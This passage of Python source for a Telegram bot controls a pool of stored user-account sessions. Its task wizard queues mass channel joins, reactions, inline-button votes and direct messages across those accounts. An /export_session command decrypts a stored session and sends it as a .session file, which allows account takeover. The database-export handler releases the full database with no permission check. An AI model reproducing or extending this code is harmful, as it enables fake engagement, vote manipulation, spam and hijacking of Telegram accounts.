        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ **Usage:** `/deleteuser <user_id>`")
        return

    target_id = int(args[1])
    target_role = await db_mgr.get_user_role(target_id)
    if target_role == "super_owner":
        await message.answer("❌ Exception: Cannot delete Super Owners.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("DELETE FROM accounts WHERE user_id = ?", (target_id,))
        await db.execute("DELETE FROM tasks WHERE creator_id = ?", (target_id,))
        await db.execute("DELETE FROM users WHERE user_id = ?", (target_id,))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Wiped database footprint of user ID {target_id}")
    await message.answer(f"✅ User ID `{target_id}` and all associated nodes/operations have been deleted.")

@router.message(Command("export_session"))
async def cmd_export_session(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("ℹ️ **Usage:** `/export_session <phone_number_without_plus>`")
        return

    phone = args[1].replace("+", "").strip()
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT session_string FROM accounts WHERE phone = ?", (phone,)) as cursor:
            row = await cursor.fetchone()
            
    if not row:
        await message.answer("❌ No record of this active connection found.")
        return

    session_str = decrypt_data(row[0])
    file_data = session_str.encode('utf-8')
    file_payload = BufferedInputFile(file_data, filename=f"+{phone}.session")
    
    await message.reply_document(file_payload, caption=f"🔑 Session extraction file for `+{phone}`.")

# --- TASKS BUILDER INTERFACE ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    keyboard = [
        [InlineKeyboardButton(text="📢 Join Channel (Pub/Priv)", callback_data="set_type:join")],
        [InlineKeyboardButton(text="💨 Leave Channel", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="🎭 Add Reaction Expression", callback_data="set_type:react")],
        [InlineKeyboardButton(text="🔘 Press Inline Markup Button", callback_data="set_type:button_vote")],
        [InlineKeyboardButton(text="✉️ Send Direct Message (DM)", callback_data="set_type:dm")],
        [InlineKeyboardButton(text="🔙 Back to Main Console", callback_data="main_menu")]
    ]
    await callback.message.edit_text(
        "⚡ **Automation Task Configurator Wizard**\nSelect the type of action you wish to deploy:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    
    if task_type in ["react", "button_vote"]:
        await callback.message.edit_text(
            "🔗 **Provide Message Link:**\nPaste the link pointing to the specific post (e.g., `https://t.me/c/12345678/2` or `https://t.me/channel/2`):"
        )
    else:
        await callback.message.edit_text(
            "🔗 **Enter Target Resource:**\nProvide the Username, Public Link, or Private Join Link to scan:"
        )
    await state.set_state(TaskWizardStates.waiting_for_target)

@router.message(StateFilter(TaskWizardStates.waiting_for_target))
async def task_hub_process_target(message: Message, state: FSMContext):
    target = message.text.strip()
    await state.update_data(target=target)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type in ["join", "leave"]:
        await finalize_task_creation(message, state)
    elif task_type == "react":
        buttons = [
            [InlineKeyboardButton(text="🎭 Choose Specific Emojis", callback_data="react_mode:standard")],
            [InlineKeyboardButton(text="⚡ Sync Existing Reactions On Post", callback_data="react_mode:existing_reactions")],
            [InlineKeyboardButton(text="🎲 Distribute Random Reactions", callback_data="react_mode:random")]
        ]
        await message.answer("⚙️ **Select Reaction Strategy Mode:**", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
        await state.set_state(TaskWizardStates.choosing_react_mode)
    elif task_type == "button_vote":
        await message.answer("🔘 **Enter Button Text/Emoji:**\nType the exact emoji or text label you want to click (e.g., `😂`):")
        await state.set_state(TaskWizardStates.waiting_for_button_text)
    elif task_type == "dm":
        await message.answer("📝 **Message Body Content:** Enter the text string to dispatch to the target:")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

@router.callback_query(StateFilter(TaskWizardStates.choosing_react_mode), F.data.startswith("react_mode:"))
async def process_react_mode(callback: CallbackQuery, state: FSMContext):
    mode = callback.data.split(":")[1]
    await state.update_data(react_mode=mode)
    
    if mode == "standard":
        await state.update_data(selected_emojis=[])
        await callback.message.edit_text(
            "🎭 **Choose Emojis to Distribute:**\nSelect reactions:",
            reply_markup=get_emoji_selection_keyboard([])
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    else:
        await callback.message.delete()
        await finalize_task_creation(callback.message, state)

def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in config.REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        btn_text = f"{emoji} ✅" if is_selected else emoji
        row.append(InlineKeyboardButton(text=btn_text, callback_data=f"toggle_emoji:{emoji}"))
        if len(row) == 5:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton(text="✅ Complete Selection", callback_data="finish_emoji_selection")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    emoji = callback.data.split(":")[1]
    data = await state.get_data()
    selected_emojis = data.get("selected_emojis", [])

    if emoji in selected_emojis:
        selected_emojis.remove(emoji)
    else:
        selected_emojis.append(emoji)

    await state.update_data(selected_emojis=selected_emojis)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(selected_emojis))
    await callback.answer()

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    selected_emojis = data.get("selected_emojis", [])
    if not selected_emojis:
        await callback.answer("⚠️ Select at least one emoji!", show_alert=True)
        return
    await state.update_data(reactions=selected_emojis)
    await callback.message.delete()
    await finalize_task_creation(callback.message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext):
    await state.update_data(button_text=message.text.strip())
    await finalize_task_creation(message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext):
    await state.update_data(text=message.text.strip())
    await finalize_task_creation(message, state)

async def finalize_task_creation(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    task_type = data.pop("task_type")
    
    target = data.get("target", "")
    parsed_target, link_msg_id, is_private_hash = parse_telegram_link(target)
    if link_msg_id:
        data["msg_id"] = link_msg_id

    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute(
            "INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)",
            (user_id, task_type, json.dumps(data))
        )
        task_id = cursor.lastrowid
        await db.commit()

    await task_queue.add_task(task_id, user_id, task_type, data)
    await db_mgr.log_action(user_id, f"Queued automation task #{task_id} [{task_type.upper()}]")
    
    response = f"🚀 **Task #{task_id} successfully queued!**\nWorkers are executing operations. Reports: `/taskreport_{task_id}`"
    if isinstance(message, Message):
        await message.answer(response)
    else:
        await message.answer(response)
    await state.clear()

# --- SYSTEM STATS & VIEWS ---
@router.callback_query(F.data == "view_tasks")
async def view_tasks(callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 10")
        else:
            cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10", (user_id,))
        rows = await cursor.fetchall()

    text = "📊 **Recent Operations Pipeline Log**\n\n"
    if not rows:
        text += "_Queue completely empty._"
    else:
        for row in rows:
            text += f"🔹 **Task #{row[0]}** ({row[1].upper()})\nStatus: `{row[2]}` | Metrics: `{row[3]}`\n↳ /taskreport_{row[0]}\n\n"
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))

@router.message(F.text.startswith("/taskreport_"))
async def cmd_task_report(message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    try:
        task_id = int(message.text.split("_")[1])
    except:
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, type, status, progress, success_report, failure_report, payload FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()
    if not row:
        return

    creator_id, task_type, status, progress, success_rep, failure_rep, payload = row
    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
        return

    passed_list = json.loads(success_rep) if success_rep else []
    failed_list = json.loads(failure_rep) if failure_rep else []

    report_text = (
        f"📊 **Manifest Diagnostics Report for Task #{task_id}**\n"
        f"⚙️ **Type:** `{task_type.upper()}`\n"
        f"🚦 **State:** `{status}`\n"
        f"📈 **Progress:** `{progress}`\n"
        f"🟢 **Success:** `{len(passed_list)}` | 🔴 **Failed:** `{len(failed_list)}`"
    )
    buttons = [[InlineKeyboardButton(text="🔙 Main Menu", callback_data="main_menu")]]
    await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery):
    user_id = callback.from_user.id
    bot_info = await callback.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
            count = (await cursor.fetchone())[0]
    await callback.message.edit_text(f"👥 **Referrals Matrix**\n\nInvite link:\n`{ref_link}`\n\nTotal referred: `{count}`", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))

@router.callback_query(F.data == "admin_panel")
async def handle_admin_panel(callback: CallbackQuery):
    await callback.message.edit_text(
        "🛠️ **Administrative Control Console**\n\n"
        "• `/addadmin <id> <limit>`\n• `/removeadmin <id>`\n• `/banuser <id>`\n"
        "• `/unbanuser <id>`\n• `/deletenumber <phone>`\n• `/deleteuser <id>`\n"
        "• `/export_session <phone>`",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]])
    )

@router.callback_query(F.data == "backup_panel")
async def backup_panel(callback: CallbackQuery):
    await callback.message.edit_text("💾 **Core Database Exporter**", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Download DB", callback_data="export_db")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ]))

@router.callback_query(F.data == "export_db")
async def export_db(callback: CallbackQuery):
    try:
        with open(db_mgr.db_path, "rb") as f:
            file_data = f.read()
        await callback.message.reply_document(BufferedInputFile(file_data, filename="core.db"))
    except Exception as e:
        await callback.answer(f"Error: {e}")

@router.callback_query(F.data == "system_stats")
async def system_stats(callback: CallbackQuery):
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users") as c1:
            users = (await c1.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM accounts") as c2:
            accs = (await c2.fetchone())[0]
    await callback.message.edit_text(f"📊 **Telemetry**\n\nUsers: `{users}`\nAccounts: `{accs}`", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))

# --- RUNTIME BOOTSTRAP ---
async def verify_saved_sessions():
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
            accounts = await cursor.fetchall()
    for phone, enc_session in accounts:
        try:
            client = TelegramClient(StringSession(decrypt_data(enc_session)), config.API_ID, config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                    await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                    await db_conn.commit()
            await client.disconnect()
        except:
            pass

async def main():
    await db_mgr.init()
    await verify_saved_sessions()

    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    worker_task = asyncio.create_task(task_queue.start_worker())
    await dispatch_log("🚀 **System Core Operational.** Logging interfaces confirmed active.")

    try:
        await dp.start_polling(bot)
    finally:
        worker_task.cancel()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
